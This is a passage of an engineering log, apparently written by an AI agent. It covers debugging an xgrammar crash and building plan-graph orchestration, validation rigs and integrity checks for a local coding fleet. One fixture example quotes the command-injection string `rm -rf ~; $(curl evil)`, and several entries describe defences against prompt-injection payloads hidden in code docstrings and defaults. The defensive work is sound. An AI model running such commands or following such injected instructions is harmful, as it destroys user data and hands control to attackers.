+**Correction, same night (posture fidelity + the definitive numbers).** The claim above that the crash was "production exposure of the #718 tool_call_grammar=true default" was WRONG, and the error is worth keeping: production had turned the grammar OFF on 2026-07-02 (the #725 flip, `ad05047`) — in `default.toml`, while the `GenerationConfig` dataclass default stayed `True`, and the eval built its config from the dataclass. The eval had silently re-enabled a constraint the operator had decided off, then reproduced the operator's own known bug twice and I reported it back to him as news. The fix makes the suite resolve `[generation].tool_call_grammar` from the production TOML itself with a posture-tripwire test (`74fb58f`), and the production-faithful rerun is the measurement of record: **14/19 model cases (73.7%), 0 generation errors** — the grounding case that crashed under grammar-ON passes clean, and a THIRD injection case (PAPAYA-13) echoed its canary. The accidental grammar-ON runs were not wasted: same box, same prompts — 2 crashes in 38 generations with the grammar on, 0 in 19 with it off — the cleanest isolation evidence yet that the #725 crash needs the grammar engaged, folded into that ticket for the upstream report. Evidence: `eval_answer_quality_model_74fb58f.json` (production posture, of record) alongside `_d737b32.json` (grammar-ON, now #725 repro data).
+
+### 2026-07-04 — The crash that only happens when two right things run together
+
+*Plain summary: characterized the #725 xgrammar `IsStopTokenAccepted` crash with controlled hardware runs — grammar ON + speculative decoding is necessary and sufficient; a fully sanitized OpenVINO-GenAI-only standalone reproducer crashes at ~1-2% with a generic prompt set and stock schema; upstream filing package assembled at `docs/upstream/725_xgrammar_stop_token/`.*
+
+The gap-closing legs turned a one-off "the runtime crashed once at go-live" into a filable bug. The method was elimination on real silicon, one variable at a time, all with the grammar configured and greedy decoding on the same 19 prompts: speculative decoding ON crashed (~1-2% of generations, nondeterministic — a different prompt each run); speculative decoding OFF, everything else identical, went 0-for-57. That single control row is the whole report — the crash lives at the seam where the draft model proposes tokens past a stop the grammar matcher has already terminated on, and the runtime asks the terminated matcher to mask them.
+
+Two findings sharpened it past the original ticket's guess. First, the trigger is not required: I streamed 57 generations token-by-token and not one emitted `<tool_call>`, yet the equivalent non-streamed runs still crashed — so a *configured but un-fired* grammar plus a draft model plus end-of-sequence is enough; the tool-call ceremony that surfaced it at go-live was incidental. Second, the companion `cc:493` warning names the token being fed to the dead matcher, and it was `498` (an ordinary word-piece) as often as `</tool_call>` — confirming it is whatever the draft guessed, not the constrained region. That reframes the bug from "tool-call grammar" to "any structured output under spec-decode," which is a bigger blast radius and worth Intel knowing.
+
+The honest part I kept in the report: streamed runs were 0/57 and non-streamed had the crashes, which *looks* like streaming avoids it — but production's real crash was streamed, N is tiny, and I will not hand a maintainer a "streaming is safe" claim that a single counterexample already refutes. Stated as unmeasured, not as a finding. The other discipline that paid off: I nearly filed with the 841-token production system prompt embedded in the repro; instead I rebuilt a generic prompt set with a stock two-tool schema and proved *that* crashes too, so the upstream artifact ships nothing internal. And the sglang precedent (#14464, same error string, fixed by implementing `is_terminated` so the dead matcher isn't queried) hands the OV maintainers a proven direction rather than just a symptom.
+
+**Next:** operator files at `openvinotoolkit/openvino.genai` per REPORT.md §8 (search existing issues first; he owns the filing as the upstream contributor). Re-enable `tool_call_grammar` only on the #725 revisit criterion — upstream fix in the pinned version + a 20/20 boundary soak + one live tool turn.
+
+*(Lesson 210.)*
+
+### 2026-07-05 — The plan that had to survive four rounds of its own medicine
+
+*Plain summary: authored and LA-ratified the fleet-maturation (M2) program plan — big-job plan-graph orchestration, five-layer capability validation, security-by-design — at `docs/research/fleet-maturation-program-plan-2026-07.md`; tickets #740–#744; the LA-approved §8 stack recommendations executed same-session (no upstream postings, per instruction); no runtime code in this commit — the three build lanes start the same night.*
+
+The session opened with a fork the Lead Architect asked me to settle honestly: mature the coding fleet, or build a medical-portal web assistant. The grounding settled it fast — the dispatch substrate is ~70% of a big-job capability and battle-tested, while the portal path has no substrate, a hostile external surface (two-factor login, anti-bot, terms that sanction the API and not the scraper), and a local-model capability bar it cannot clear. The medical path got what it deserved instead of what was asked for: a bounded draft-and-approve roadmap (Appendix A), grounded in Epic's own developer documentation, that the LA accepted as satisfying. I went with the fleet because the remaining gap — dependency-ordered plans, context handoff, integration verification, failure policy — is deterministic orchestration around proven parts, accepting that the demo-flashier web-agent path would have consumed the window and matured nothing.
+
+The part worth keeping is what the review did. The LA is a non-technical operator, and his four review rounds still caught the two classic ways engineering plans lie to themselves. Round two: the maturity claim ("reliable at 3–8 units") had a demonstration behind it, not a validation scheme — one rigged negative and N=2 live runs. That became §9: a five-layer scheme with an orchestration simulator, eight adversarial rigs, a live capability battery with a zero-FALSE-DONE hard gate, and a standing regression battery that earns the statistical claim over weeks instead of asserting it from three runs. Round three: the validation scheme itself had no owner — its artifacts were named in the definition-of-done but no workstream built them, the effort totals didn't cost them, and that is exactly how partial builds ship while looking complete. W9 now owns them, and the totals honestly grew from 20–29 h to 24–34 h; the delta *is* the previously-invisible validation build. The same round asked where security was, and it was right to: §10 now threat-models the six new surfaces — the context packs are the genuinely novel one, a worm-shaped channel where our own code copies task A's built output toward task B's prompt, controlled by structural-only extraction — and names the residual it does not close (unsandboxed model-written test execution) instead of hiding it.
+
+Round four interrogated that residual and produced a better design than the plan had: the LA asked whether the Hyper-V guest could close it. Wholesale, no — Alpine-pass is not Windows-pass, the offline guest cannot install dependencies, and per-candidate transport over vsock is a tax — but bounded, yes: re-run the job-level oracle inside the NIC-less guest (no TCP/IP stack exists, so exfiltration is structurally impossible) in the swap machine's RAM-free window, once per job. That is #744, accepted, sequenced post-M2. I recorded the rejection and the acceptance both — the trade-off is the record.
+
+Also executed this session under explicit approval, postings excluded: the compile-cache gap confirmed real (`start-llm.ps1:223` has no `--cache_dir` — a W7 fix now), the persistent-KV feature request re-verified as genuinely greenfield upstream and strengthened with the dispatch swap workload (filing deferred, #710), the model_server idle-unload PR put on a monthly watch (#741), a bounded coder A/B ticketed in the only form that fits 31.3 GB (#742), and the dispatch brief's two [VERIFY] landmines resolved with a dated note committed on the agentic-setup side (`bfe1d9d`).
+
+**Next:** the three build lanes (W1/W2 core, W7 fleet hardening, W9 validation-first) run per plan §6.3; merge train overnight; Stage-1 live battery + rigged negatives in the first coder residency; the LA's GO is on #740.
+
+*(Lesson 211.)*
+
+### 2026-07-05 — Teaching the dispatch to see a job as a graph it still refuses to trust
+
+*Plain summary: M2 W1+W2 (Vikunja #740, Lane A) — new `shared/fleet/plan_graph.py`
+(the jobplan/v1 schema, deterministic ruler, wave compiler, evidence-gated status
+machine, hash-verified PlanStore) plus decompose v3 (`depends_on` + `contract`
+elicited on the SAME 14B call, ruler re-mapping, an optional grammar-constrained
+emission hook, and the gold-plan calibration scorer in `evals/plan_calibration.py`).
+Dormant behind the new `[fleet_dispatch].plan_graph = false` knob; no driver wiring
+(Lane A2's job). No new lesson class — the build APPLIES C19 (cross-language/mirror
+drift guarded by a gate test) and the model-proposes-ruler-disposes doctrine.*
+
+The dispatch has known for weeks how to turn an idea into tasks; what it could not
+do was say which task stands on which. This session built the missing vocabulary —
+and the interesting work was almost entirely in deciding how much of the model's
+new vocabulary to believe. The answer, everywhere: none of it, until a deterministic
+ruler has had its say. `validate_plan` slugs every id through the same `slugify_task`
+the queue already trusts (a task named `rm -rf ~; $(curl evil)` becomes an inert
+kebab slug — the N7 fixture proves no metacharacter survives), re-checks repo
+containment with the same `validate_repo` a dispatch target passes, drops unknown
+and self references with a logged warning, and treats a dependency cycle not as an
+error to repair but as evidence the whole graph is untrustworthy.
+
+That cycle call was the first real trade-off. The surgical option — snip only the
+edges that close the cycle and keep the rest of the graph — recovers more structure,
+and I rejected it: a surgically-repaired graph is a graph nobody proposed. The model
+did not propose it (its graph was cyclic), and the ruler cannot claim to know which
+edge was the wrong one. The pinned contract's fallback — replace ALL edges with the
+original-order linear chain — is exactly today's live-proven serial semantics, so
+degradation lands on a path with weeks of production history instead of a novel
+one. I went with the blunt fallback because the failure mode of cleverness here is
+a plausible-looking wrong order, accepting that a mostly-good graph loses its
+parallel branches when one bad edge poisons it.
+
+The second trade-off hid in a question that looks cosmetic: when the model omits
+`depends_on`, is that an empty list or a missing field? I made the parser preserve
+the distinction — the key is attached only when the model actually emitted a valid
+list — because the two mean opposite things at plan-build time. An emission where NO
+task carries the key is graph-unaware (an old-shape or confused model), and
+`build_plan_raw` degrades it to the linear chain: today's behavior, byte-identical.
+An emission where tasks carry explicit `[]` is a deliberate claim of independence,
+which is what lets a three-utility job compile into one wave (the B7 battery shape)
+instead of a fake chain. The rejected alternative — always attach the key — would
+have been tidier shapes at the cost of erasing the only signal that distinguishes
+"the model said independent" from "the model said nothing," and it would have
+changed the task-dict shape every existing caller sees. A locked test now pins the
+legacy two-key shape exactly. The cost I accepted: `compile_prompts`' appended
+`acceptance-tests` task carries no graph keys, so under a graph-aware plan the
+naive rule would seat the job's final exam in wave 1 — I documented that seam in
+`build_plan_raw`'s docstring and flagged it to the W4 lane rather than guessing a
+placement rule here.
+
+Two smaller calls worth the record. The status machine raises on everything
+illegitimate — `mark_merged("")` is a `ValueError`, not a no-op — because the whole
+point of evidence-gating is that the cheap path (forgetting the evidence) must be
+the loud path; and `blocked` propagates `skipped` to dependents exactly like
+`parked` does, a mechanical consequence of "a dependent must never build on a
+missing foundation" rather than a posture choice (a blocked task did not merge;
+its children have nothing to stand on). And the contract caps (notes ≤ 280, list
+and item bounds, control-char strip) live ONCE in `decompose.py` with
+`plan_graph`'s ruler importing them — elicitation, the grammar schema, and
+load-time validation literally cannot drift apart, and a parity test locks the
+delegation. That is C19 applied at design time instead of learned again at review
+time.
+
+The grammar hook stayed deliberately thin: `decompose_request` takes an optional
+`structured_generate_fn(prompt, json_schema)` tried FIRST, with a transparent
+fall-through to the free-text-plus-regex path on any exception, empty return, or
+unparseable output — proven offline with fakes, including the worst case (both
+paths garbage still ends at the increment-1 single-task fallback, never a new
+refusal). The live adapter over `StructuredOutputConfig.json_schema` is Lane
+A2/W8's wiring; what this session guarantees is that the seam cannot make a
+dispatch worse than today, only more parseable. One honest risk carried forward:
+the elicitation grows the plan emission, and `_PLAN_MAX_NEW_TOKENS = 1024`
+(entrypoint.py:136) was already tight enough to truncate a thinking-heavy split —
+the W8 live check should watch for truncation-shaped fallbacks and consider a
+budget bump alongside the grammar constraint, which structurally cannot ramble.
+
+The calibration scorer closes the loop the research plan demanded: a decompose is
+now measured against a gold plan (task-count match, dependency-edge F1 through a
+deterministic greedy token alignment, contract-file Jaccard) instead of eyeballed.
+Lane V owns the three canonical golds; since they had not landed on my branch
+point, a clearly-marked provisional gold
+(`evals/battery/gold/gold-b1-expense-tracker.provisional.json`) gives the scorer a
+tested fixture — supersede it, don't extend it.
+
+**Next:** Lane A2 wires the knob + `PlanStore` + waves into `swap_driver` (pin the
+write-time `plan_hash` in swap state; decide the acceptance-tests task's
+`depends_on` stamp with W4); Lane V's golds replace the provisional one and the
+scorer runs against real 14B decompositions in the W8 residency (`python -m
+evals.plan_calibration`); the live grammar adapter gets its first Arc 140V check
+alongside a `_PLAN_MAX_NEW_TOKENS` truncation watch.
+
+*(commit `<this>` (W2 + fragment) atop `a3f87d8` (W1); suites: test_plan_graph 54,
+test_decompose_graph 31, fleet-adjacent subset 417, standing gate green in the
+worktree; knob ships `plan_graph = false` — nothing changes until Lane A2 wires it. No new lesson (applies C19 + the model-proposes-ruler-disposes doctrine).)*
+
+### 2026-07-05 — Building the net before the thing it catches
+
+*Plain summary: M2 workstream W9 — the fleet-maturation validation infrastructure
+(battery spec + gold JobPlans + scorecard schema/emitter + battery runner + N4–N7
+adversarial rigs + the ~30-scenario L1 orchestration simulator), authored
+TEST-FIRST against a plan-graph driver that does not exist yet. Surfaced a
+load-bearing gap in the pinned JobPlan v1 contract.*
+
+W9 is the odd workstream: it validates code the other lanes haven't written. The
+discipline the plan (§9) insists on — "a gate we never watched fail is theater" —
+cuts both ways, so the interesting question was how to ship a testing harness that
+is itself *proven* today while the driver it drives is still a week out. The
+answer was to split every deliverable into a part that runs now and a part that
+goes live when Lane A merges. The battery cards, the gold plans, the scorecard
+emitter, the JobPlan validator, the wave compiler, and the N4–N7 rigs are all
+real, exercised, gate-green today. The full-pipeline simulator — 30 scenarios
+driving the real wave scheduler through the `SwapOps` seam — is `importorskip`-ed
+on `shared.fleet.plan_graph`: green-by-skip on today's main, live the moment W1
+lands. 61 of my tests pass now; 30 skip with a reason that names exactly what
+they're waiting for.
+
+The scenario table is where I leaned hardest on test-first. Authoring the plan as
+*data* (park-in-wave-1 vs wave-N, diamond skip propagation, cycle→linear-chain
+fallback, junk→single-task degrade, re-decompose-once-then-park, integration-node
+red short-circuit, job-oracle-red-despite-all-merged) forced the state machine to
+be pinned before it exists. And rather than trust 30 hand-written expectation
+dicts, I made the table check *itself*: a meta-test recomputes skip-propagation
+from graph reachability and asserts it equals every scenario's declared `skipped`
+set, another checks the declared waves against the reference wave compiler, and a
+third refuses to let any scenario ever *expect* a FALSE-DONE. That last one is the
+point of the whole program encoded as a unit test — the unforgivable outcome is
+never a target, only ever a detected failure. If a future edit mis-states an
+expected status, the reachability meta-test goes red before the driver is ever
+consulted. That is the mutation-resistance requirement applied one level up, to
+the harness itself.
+
+The trade-off I want on the record: I guessed the W1 driver's injection seam
+(`simulate_job_plan(plan, *, run_task, generate_fn, oracle_status,
+plan_graph_enabled)`) and resolved it *defensively* — if `plan_graph` exists but
+that exact symbol isn't wired yet, the scenario skips with a clear reason instead
+of failing. The alternative was a hard `getattr` that turns the whole suite red
+the instant a *partial* W1 lands. I chose green-by-skip-until-the-seam-exists
+because a test-first scaffold that cries wolf on every intermediate commit trains
+the fleet to ignore it. The cost: a real integration miss (W1 ships a differently
+shaped seam) reads as a skip, not a failure, until someone reconciles the names.
+I accepted that because the seam is documented at the resolver and the battery's
+own live run (W8) is the backstop that a skip can't hide behind.
+
+The load-bearing finding is a gap in the pinned JobPlan v1 contract itself.
+`plan_hash` is specified as `"sha256 canonical(goal+tasks), set by PlanStore"` —
+but `canonical()` is never defined, and authoring three gold plans made the
+absence bite immediately: I couldn't stamp a hash without deciding what goes into
+it. The decisive sub-question is whether the volatile per-task `status` field is
+inside the hash. It cannot be — `status` changes on every scheduler write, so a
+status-covering hash self-invalidates mid-run, and worse, the §10 S1 load-time
+tamper check would then fire on the system's *own* legitimate writes. So my
+reference canonicalization (`reference_plan_hash`) drops `status` before hashing,
+sorts keys, uses compact separators over UTF-8, and I flagged it at the top of the
+report and in the battery README for Lane A's PlanStore to adopt or supersede. The
+deeper observation underneath it: `status` is the one mutable field living inside
+an otherwise-immutable, hashed artifact — the contract might be cleaner holding
+task statuses in a separate runtime map so the plan itself never mutates. I did
+not touch the pinned schema (the brief forbids it); I implemented against it
+faithfully and surfaced the friction rather than papering over it.
+
+**Next:** Lane A/W1 lands `shared.fleet.plan_graph` with the wave scheduler and the
+`simulate_job_plan` seam → the 30 simulator scenarios flip from skip to live with
+no change here (or a one-line seam-name reconciliation). W1 must also fix the
+`plan_hash` canonicalization: adopt `reference_plan_hash` (drop `status`) or
+supersede it and re-stamp `evals/battery/gold/*.json` + the N7 tamper rig in the
+same change. W3 implements the real structural context-pack extractor against the
+same assertions the N6 rig + `reference_extractor` stub already pin. W8 executes
+the reduced battery (B1/B3/B8) on the Arc 140V through this runner — the first
+scorecards land in `docs/performance/` via the scrub pipeline.
+
+*(Lesson 212.)*
+
+### 2026-07-05 — The seal that covered less than the docstring claimed
+
+*Plain summary: hardened the M2 W1 plan-graph (`shared/fleet/plan_graph.py`, `dispatch.py`, the W9 battery reference hash + golds, the N7 rigs) against a merged adversarial-review defect set (#740). Broadened the plan-identity hash from goal+tasks to the FULL immutable identity, restated the integrity contract honestly (status is advisory-from-disk), gated `mark_merged`/`mark_job_acceptance` against FALSE-DONE, made `load()` degrade instead of crash, and closed three defense-in-depth gaps. Reproduce-then-close throughout. Lesson classes: C14 (a control that claims more than it delivers), C15/170 (a guard on one path but not its sibling), C3/186 (a permissive test certifying the bug).*
+
+The plan-graph is the deterministic ruler that stops the 14B self-certifying a
+dependency graph, and its `PlanStore` docstring made a confident promise: *"the
+driver never trusts its own artifact… on-disk tamper between write and read ⇒
+refuse."* The adversarial review found the promise was three-quarters true. The
+hash it verified on load covered only `{goal, tasks-minus-status}`. So the job
+**oracle_path**, the **repo**, the re-decompose **budget ceilings**, and every
+integration/acceptance status loaded tamper-free — and a redirected oracle_path
+is a textbook FALSE-DONE surface: point the job oracle at a trivially-passing
+file and the plan "passes" its own acceptance. The seal covered less than the
+docstring claimed, which is the worst kind of security comment because a reader
+trusts the guarantee that isn't there.
+
+I took the integrity model as the load-bearing decision of this pass, and it is
+worth naming the trade-off on the record. The obvious "fix" — hash the whole
+artifact — is wrong: task status, `budget.spent`, and node/acceptance status
+change on every legitimate scheduler write, so a whole-artifact hash would be a
+moving target that self-invalidates mid-run and fires the tamper check on the
+system's OWN writes. So `compute_plan_hash` now seals the **immutable identity**
+— goal, repo, oracle_path + criteria, budget *limits*, each integration wave
+index, and per task id/prompt/depends_on/contract — and deliberately EXCLUDES the
+mutable runtime state. The consequence I wrote into the module as an explicit
+INTEGRITY CONTRACT (Lane A2 depends on it): the on-disk **status is ADVISORY, not
+integrity-covered**. A driver must re-derive done-ness from a fresh oracle run,
+never trust the persisted status as proof of completion. That is the honest
+guarantee — a whole-artifact seal was never on the table without breaking the
+run — and the docstring now says exactly that instead of overclaiming. The
+change is mirrored byte-for-byte in the W9 battery `reference_plan_hash` (two
+lanes, one canonicalization, locked by `test_plan_hash_matches_w9_battery_reference`),
+and the three hand-authored gold plans were re-stamped in the same change so the
+contract that yesterday's hash encoded doesn't calcify into today's spec.
+
+The other findings were smaller but each had a clear single fix. **H1**: the
+"dependencies must be merged" invariant lived only in `mark_ready`, so a raw
+`pending → merged` skipped it entirely — a task could be marked done whose
+foundations never merged. `mark_merged` now requires source status in
+{ready, building}, so every path into `merged` carries the gate. **H2**: a job
+could be marked `passed` while a task was still pending — the FALSE-DONE the §9
+zero-tolerance invariant exists to forbid; `passed` now requires every task
+terminal (failed/not-run stay unrestricted; the GREEN-vs-PARKED nuance stays in
+§9.4 verdict logic, out of scope here). The pinned test that *asserted* passing
+with a pending task — a permissive test certifying the bug — was rewritten to the
+new contract. **H4**: `load()` caught `OSError`/`(ValueError, TypeError)` but not
+`UnicodeDecodeError` on read or `RecursionError` on a ~200k-deep nested-array
+JSON, so both crashed a control whose whole job is to refuse; it now degrades to
+a clean refusal on any read/parse failure. **H5**: the forbidden-root check was
+case-sensitive (`projects/blarai` slipped the name net — the same directory on
+Windows), integration `after_wave` accepted `true` (`isinstance(True, int)`), and
+goal/prompt/oracle_path had no length cap or control-char strip while contract
+fields did — casefolded, bool-excluded (mirroring the budget guard), capped and
+stripped. **H6**: two ids colliding on the first 48 slug chars slugify
+identically; the dropped duplicate's dependents silently retargeted onto the
+*surviving* task — a different unit of work — so a collided ref is now dropped as
+ambiguous, never retargeted.
+
+The discipline that made this trustworthy was reproduce-then-close: a throwaway
+script first proved all ten behaviors defective on today's code (pending→merged
+succeeds; job passes with a pending task; oracle_path/budget tamper loads ok;
+bad-UTF-8 and deep-JSON crash; `blarai` accepted; bool `after_wave` kept; goal
+uncapped; dependent retargeted), and only then did each fix land with a permanent
+gate test that I watched fail against the fault it guards. The two new N7 rigs
+make the integrity split legible on disk: `tampered_oracle_path.json` (a hashed
+field redirected — load REFUSES) and `advisory_status.json` (status flipped —
+load SUCCEEDS, status is advisory). All valid-input behavior is byte-identical:
+the existing round-trip, gold-validation, and `plan_graph=false` paths are
+untouched, and the standing gate is green.
+
+**Next:** Lane A2 wiring can now rely on the stated contract — pin the write-time
+identity hash in swap state and re-derive task done-ness from a fresh oracle run
+rather than reading the persisted status. The orchestrator reviews + merges this
+branch; the fetch/simulator seams (`test_job_pipeline_e2e` still skips pending
+W3/W4/W5) remain the next M2 increment.
+
+*(Lessons 97, 170, 186 tallies.)*
+
+### 2026-07-05 — Teaching the fleet to finish a job, not just its pieces
+
+*Plain summary: M2 W3–W6 + the routed-in RESTART-AO hardening (#740, Lane A2) — context
+packs (`shared/fleet/context_pack.py`), the wave scheduler + per-wave integration gate +
+job-level oracle in `swap_driver.py`/`acceptance.py`/`swap_ops.py`, the bounded
+evidence-fed failure policy in `plan_graph.py`/`decompose.py`, the machine scorecard +
+JOB_SUMMARY + `watch.py` plan view, and the launcher-stacking fix in the 14B-restore
+retry loop. All dormant behind `[fleet_dispatch].plan_graph=false`.*
+
+The gap this closes is the one the M2 plan names most sharply: for a multi-task job,
+"done" meant "every task merged" — nothing ever verified the composed whole, and the
+final acceptance-tests task was written by the same 30B it graded. Tonight the swap
+driver learned to run a validated JobPlan in dependency waves; each dependent task now
+gets a context pack naming what its foundations actually built; every merging wave is
+gated on the *integrated* main; and the job may only report done when a job-level,
+14B-written, spec-blind oracle passes on the final tree. The verdict line in the
+scorecard is computed, not asserted: GREEN requires every task merged, no failed wave
+gate, and the oracle green — an unrun oracle can never be GREEN, which is §9's
+zero-FALSE-DONE invariant expressed as a pure function.
+
+The trade-off I want on the record is the context pack's security posture. A pack
+copies content derived from task A's *built output* into task B's *prompt* — the plan
+calls it the one genuinely novel channel M2 creates, and worm-shaped if done carelessly.
+I rejected the easy version (slice the source, cap the length) for a structural one:
+Python signatures are *reconstructed* from the AST with parameter names only — defaults
+are never rendered, because a default value is an arbitrary expression and the classic
+instruction-payload carrier; annotations are dropped unless quote-free; the mjs side
+regexes export lines and replaces any parameter group containing a quote with an
+ellipsis. The N6 rig in the tests feeds a dependency whose docstrings, comments, and
+defaults all scream adversarial instructions, and asserts none of it can reach a prompt
+— not "doesn't", *can't*, because no string-literal content survives extraction by
+construction. The cost is real: a legitimately informative default (`limit=100`) is
+invisible to the next coder. The contract's `notes` field — ruler-validated plan
+content, the one sanctioned prose channel — is where that information belongs.
+
+The failure policy took the most judgment. A consistently-failing task (the fleet's
+best-of-N + resample already exhausted by the time a run_task returns non-MERGED) gets
+exactly one evidence-fed re-decompose: the failing evidence is *structurally* extracted
+(test identifiers, assert lines, exit codes — never coder prose, §10 S3), fed through
+the proven #691 split machinery, and the replacement lands only when the ruler
+re-validates 2–3 children that rewire cleanly (roots inherit the parent's deps;
+dependents now wait on all children; any id collision or child-cycle refuses the whole
+replace and the task parks instead). Budgets are the plan's own persisted counters, and
+the N4 test proves the no-loop property: identical failure → one replan → children fail
+→ budget exhausts → subtree parks with evidence. What I deliberately did *not* build is
+the live model transport for that replan — mid-swap the 14B planner is not resident,
+and no fleet script exposes a free-text generation seam the driver could argv-invoke.
+The deterministic policy is fully built and locked against the injected seam; wiring a
+transport is a W8 residency-choreography call, and pretending otherwise tonight would
+have meant either an untested start-llm round-trip on the operator's dispatches or a
+new fleet script in a repo that isn't mine. The honest default: no re-planner → park,
+which is exactly today's behavior.
+
+The routed-in hardening found its shape once I read `_restart_with_retry` against the
+2026-07-03 `SWAP_FAILED → RECOVERED` live failure. The old loop respawned the launcher
+every attempt — but a cold 14B load under post-swap memory pressure can outlast one
+180-second ready-poll, and the *second* spawn then hits the launcher's single-instance
+lock and exits immediately, silently burning the remaining attempts while the first
+launcher was still coming up. The fix is a `relaunch_in_flight` seam: the live wiring
+holds the spawned Popen and reports poll()-alive, and the retry loop *waits* on a
+still-starting launcher instead of stacking a second one; backoff now escalates bounded
+(3→6→…, capped), spawn-exceptions are logged distinctly from ready-timeouts, and the
+give-up signal finally says which terminal world you are in — a launcher still alive
+("give it a minute") versus dead ("restart BlarAI"). The default seam returns False, so
+every legacy test still sees byte-identical spawn-every-attempt behavior. The live
+verify of the in-flight path on real hardware is a W8 item, named, not implied.
+
+Mid-build the W1 adversarial-review hardening landed a constraint worth its own
+sentence: persisted plan statuses are advisory resumption hints, never authority — the
+plan hash covers only the immutable identity, and done-ness must be re-derived from
+fleet RESULT lines and a fresh oracle run. My driver already satisfied it structurally
+(every run builds a fresh plan with all statuses pinned pending; transitions only ever
+route ready→building→merged off this run's evidence), but "already satisfied" is not a
+control, so the forged-status regression lock now exists: a swap-state task claiming
+`status=merged` lands in the plan as pending, proven by test.
+
+Lane V's W9 landed on main mid-build, so the reconciliation happened in-branch rather
+than at merge. Three things came out of it. First, the scorecard is now shaped to be
+*adopted*, not merely admired: the battery runner's `adopt_driver_scorecard` reads
+exactly the file this driver writes, overlays the battery context, and validates — so
+my card now speaks its conventions (`samples_consumed=-1` for not-instrumented, a
+valid attribution on every non-GREEN, `interventions` carrying the operator-cancel
+signal, `evidence.oracle_status` feeding the runner's FALSE-DONE cross-check), and a
+regression lock drives the REAL adopter end-to-end so a drift would fail loudly
+instead of silently degrading every verdict to STALLED+HARNESS. Second, the verdict
+vocabulary moved to Lane V's glosses where mine differed: merged-but-oracle-unrun is
+now STALLED ("could not be scored" — their scenario names it the FALSE-DONE class),
+not a PARKED-HONEST. Third, my extractor now passes the N6 rig over Lane V's actual
+poisoned-fixture corpus, not just my own — the stub their rig asserts against says it
+retires when W3 satisfies the same property, and now it can.
+
+**Next:** the e2e simulator's 30 scenarios stay green-by-skip until a
+`simulate_job_plan` seam lands on plan_graph — deliberately NOT force-fit tonight:
+several scenarios need steering channels the declared runner signature cannot carry
+(wave-gate-red, stalled-mid-task, recovered, and scripted splits whose fake only
+fires on prompts containing child ids the driver cannot know), so wiring it means
+either a rig-grammar convention or a seam-contract amendment — flagged for the merge
+owner rather than guessed. W8 wires the re-decompose model transport + live-runs the
+wave gate/job oracle on the Arc 140V (Stage-1 B1), flips `plan_graph=true` after the
+live proof per the proven-features-default-LIVE rule, and live-verifies the
+RESTART-AO in-flight path; `test_m2_rigs` can then be re-pointed from the reference
+stub to `context_pack` and the stub retired.
+
+*(commit `<this>`: W3 `context_pack.py` + 22 tests incl. the N6 poisoned-dependency rig;
+W4 wave gate + job oracle (python `tests/test_job_acceptance.py` + node
+`tests/acceptance.job.test.mjs`, restore-before-grade, pinned-path containment) + 45
+tests; W5 dependent-skip/re-decompose/budgets/verdict-edges + the RESTART-AO
+in-flight/backoff/terminal-distinction locks — 33 tests; W6 scorecard
+(`m2-scorecard/v1`) + JOB_SUMMARY + `watch.py --plan` view + 7 harness tests; fleet
+blast radius 317/0 targeted + full standing gate 5269+/0 on the worktree (21 known
+worktree env-skips); `plan_graph` stays false, live wave-gate/oracle/transport
+verifies await W8. Lesson 213.)*
+
+### 2026-07-05 — Wiring the net to the thing it catches
+
+*Plain summary: M2 #740 — landed `shared.fleet.plan_graph.simulate_job_plan`, the
+L1 orchestration-simulator seam W9 authored test-first against a driver that did not
+yet exist. Flipped Lane V's 30 e2e scenarios from importorskip-skip to LIVE by driving
+the REAL `SwapDriver._run_plan_waves` model-free through the `SwapOps` seam — no
+parallel reimplementation. Lesson class: cross-lane contract under-specification.*
+
+W9 built the simulator before the driver; A2 built the driver and deliberately did
+NOT force-fit the seam, flagging that "several scenarios need steering channels the
+declared runner signature cannot carry." Wiring it was the job of reconciling those
+two lanes on the merged tree — and the interesting part was proving the harness rides
+the REAL decision loop, not a convenient parallel copy of it, because a simulator that
+passes when the driver is broken is exactly the theater the program forbids (§9 R3).
+
+The load-bearing call was HOW to reuse. A2 had already factored every external effect
+of the plan-graph path — the fleet run, the per-wave gate, the job oracle, the
+re-decompose transport, the git reads — behind the injected `SwapOps` boundary,
+specifically so a model-free harness could drive the loop. So I did NOT extract a new
+`_orchestrate` core (a refactor of a 1600-line driver, with a real risk of drifting
+its behaviour); I construct a real `SwapDriver` with a fully scripted `SwapOps` and
+call `_run_plan_waves` + `_run_job_acceptance`, then the real `build_scorecard` /
+`compute_job_verdict` / `render_job_summary`. Zero lines of swap_driver.py or
+swap_ops.py changed — the 297 driver/ops/gate/failure-policy tests are byte-identical
+— and the simulator is LITERALLY the same code the Arc 140V will run, so a bug in the
+wave order, a skip-propagation defect, or a verdict miswiring surfaces in both by
+construction. The anti-parallel-impl guard test proves it teeth-first: no-op the real
+`mark_merged` and a happy chain can no longer report GREEN (it goes STALLED); force
+`compute_job_verdict` to GREEN and a PARKED-HONEST scenario wrongly reports done. The
+simulator calls `validate_plan`, `compile_waves`, `mark_ready`/`mark_building`/
+`mark_merged`/`mark_parked`/`mark_blocked`, `_skip_dependents`/`_skip_all_pending`,
+`replace_task_with_children` + `spend_redecompose` (via the real `split_failed_task`),
+`mark_integration`, `mark_job_acceptance`, `compute_job_verdict`, `build_scorecard`,
+and `render_job_summary` — the whole real spine.
+
+The friction A2 flagged was real and it is the honest part of this entry. The declared
+signature `(plan, run_task, generate_fn, oracle_status, plan_graph_enabled)` genuinely
+cannot carry four steerings, and two different resolutions were needed. Task-level
+steering — a wedged `HANG` the watchdog must tree-kill, and a `PARKED-THEN-CHILDREN-
+MERGE` that parks once then its re-decomposition succeeds — the scenario author DID
+encode, in the `fleet_results` codes; the rig's `_scripted_run_task` merely collapsed
+them to `PARKED` and dropped the signal. So the faithful fix was a rig-grammar
+convention: carry the raw code verbatim in the outcome `detail` (it rides the fleet
+RESULT line, which is exactly the failing-evidence surface the real re-decompose
+already reads), and let the scripted 14B fire through a `[[redecompose:<id>]]` marker
+(the real `_SPLIT_TEMPLATE` prompt is built from the FAILED task's text and cannot name
+children the model has not proposed yet — the precise reason A2 could not wire it
+blind). Both fake edits preserve their meta-tests. The other two steerings —
+a wave integration gate BREAKING, and a boot-side crash-then-RECOVER — have no
+per-task channel at all; the scenario encodes them only in `plan_id`, so the simulator
+reads `plan_id` to script the matching injected `SwapOps` effect (gate returns ok=False
+at the target wave; the verdict overlays RECOVERED). The trade-off I took, with the
+alternative on the record: I read `plan_id` for exactly those two environment
+conditions rather than amend the seam signature to add explicit `wave_gate`/`recovered`
+channels. The seam amendment is cleaner in the abstract, but it would have rewritten
+the frozen runner contract W9 pinned at :680-752 and every scenario's `run(...)` call
+for two conditions that four out of thirty scenarios use; reading the identity the
+scenario already carries keeps the contract still and confines the convention to the
